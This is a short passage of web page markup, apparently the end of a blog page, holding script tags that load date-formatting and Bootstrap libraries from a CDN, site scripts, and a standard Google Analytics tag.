src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-WXLRG68JVE"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-WXLRG68JVE'); }); </script>
